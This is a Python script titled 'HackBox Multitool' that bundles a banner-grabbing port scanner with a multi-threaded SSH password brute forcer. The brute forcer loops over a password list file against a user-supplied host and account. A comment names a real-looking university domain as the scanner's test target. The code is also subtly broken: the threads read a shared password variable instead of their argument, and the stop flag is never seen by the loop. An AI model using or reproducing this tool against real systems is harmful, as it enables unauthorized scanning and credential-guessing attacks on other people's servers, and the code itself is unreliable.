import os # Used for clear() command - Clears the console output.
import time # Used for time.sleep() command - Pauses the execution for X seconds.
import random # Used for random.randint() function.
import datetime # Used for datetime.datetime.now() function and X.strftime() method.
import socket # 
from IPy import IP # 
import paramiko # 
import sys # 
import termcolor # 
import threading # 

# This function performs a console output clear.
def FN_ClearCMD():
    clear = lambda: os.system('cls')
    clear()
    return

# This function queries the system date.
# Returns a string in the YYYYMMDD-HHMMSS format.
def FN_GetLongStructuredDate():
    # Get the current date
    CurrentDate = datetime.datetime.now()
    # Format the date to "DDMMYY"
    LongCustomDateString = CurrentDate.strftime("%Y%m%d-%H%M%S")
    return LongCustomDateString

# Sleeps for X seconds (float number)
def FN_SleepSeconds(InputTime):
    time.sleep(InputTime)
    return

# Delays the program execution while waiting for user input (Enter key)
def FN_PressEnterToContinue():
    str(input("Press Enter to continue..."))
    return


# - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - #

# PORT SCANNER

# TEST ADDRESS arh.bg.ac.rs

def Tool_PortScanner():
    def CheckIP(TargetIP):
        try:
            IP(TargetIP)
            return TargetIP
        except ValueError:
            return socket.gethostbyname(TargetIP)

    def ScanTarget(TargetAddress):
        ConvertedIP = CheckIP(TargetAddress)
        print('\n' + '[-_0 Scanning Target] ' + str(TargetAddress))
        PortMin = 1
        PortMax = 500
        for TargetPort in range(PortMin, PortMax):
            ScanPort(ConvertedIP, TargetPort)

    def GetBanner(TargetSocket):
        return TargetSocket.recv(1024)

    def ScanPort(TargetIP, TargetPort):
        try:
            ActiveSocket = socket.socket()
            ActiveSocket.settimeout(0.5)
            ActiveSocket.connect((TargetIP, TargetPort))
            try:
                ActiveBanner = GetBanner(ActiveSocket)
                print('[+] Open Port ' + str(TargetPort) + ' : ' + str(ActiveBanner.decode().strip('\n')))
            except Exception as e:
                print('[+] Open Port ' + str(TargetPort))
        except Exception as e:
            pass

    if __name__ == "__main__":
        targets = input('[+] Enter Target/s To Scan (split multiple targets with ,): ')
        if ',' in targets:
            for ip_add in targets.split(','):
                ScanTarget(ip_add.strip())
        else:
            ScanTarget(targets)


# - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - #

# SSH BRUTE FORCER - MULTI THREADED

def Tool_SSHBruteForcer():
    stop_flag = 0

    def SSH_Connect(Password):
        global stop_flag
        SSHConnection = paramiko.SSHClient()
        SSHConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            SSHConnection.connect(TargetHost, port=22, username=TargetUsername, password=CurrentPassword)
            stop_flag = 1
            print(termcolor.colored(('[+] Found Password: ' + CurrentPassword + ', For Account: ' + TargetUsername), 'green'))
        except:
            print(termcolor.colored(('[-] Incorrect Login: ' + CurrentPassword), 'red'))
        SSHConnection.close()

    TargetHost = input('[+] Target Address: ')
    TargetUsername = input('[+] SSH Username: ')
    #TargetPasswordList = input('[+] Passwords File: ')
    PasswordList = "./Resources/PasswordList-v1.txt"
    print('\n')

    if os.path.exists(PasswordList) == False:
        print('[!!] That File/Path Doesnt Exist')
        sys.exit(1)

    print('* * * Starting Threaded SSH Bruteforce On ' + TargetHost + ' With Account: ' + TargetUsername + '* * *')

    with open(PasswordList, 'r') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            CurrentPassword = line.strip()
            t = threading.Thread(target=SSH_Connect, args=(CurrentPassword,))
            t.start()
            time.sleep(0.5)


# - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - # - #

# MAIN EXECUTION THREAD
MenuAlreadyShown = False
UserWantsToSwitch = False
UserWantsToExit = False
InputErrorOccured = False
# Keep running until the user wants to quit the program
while UserWantsToExit == False:
    FN_ClearCMD() # Clear the console
    print("[Welcome to HackBox Multitool V1.0 developed by ADIOP Team. All Rights Reserved 2024.]")
    FN_SleepSeconds(0.025)
    if (MenuAlreadyShown == False) and (InputErrorOccured == False):
        print("Please enter an option number from the following list:")
        MenuAlreadyShown = True
    FN_SleepSeconds(0.025)
    print("[1] -> Port Scanner")
    FN_SleepSeconds(0.025)
    print("[2] -> SSH Brute Forcer")
    FN_SleepSeconds(0.025)
    print("[3] -> Exit")
    FN_SleepSeconds(0.025)
    try:
        InputErrorOccured = False
        MenuMode = int(input("Enter an option number: "))
    except:
        InputErrorOccured = True
        continue
    if (MenuMode == 1):
        FN_ClearCMD()
        print("Tool #1 Selected")
        Tool_PortScanner()
    elif (MenuMode == 2):
        FN_ClearCMD()
        print("Tool #2 Selected")
        Tool_SSHBruteForcer()
    elif (MenuMode == 3):
        print("Exiting program...")
        break
    else:
        InputErrorOccured = True
        continue
print("Thanks for using our software!")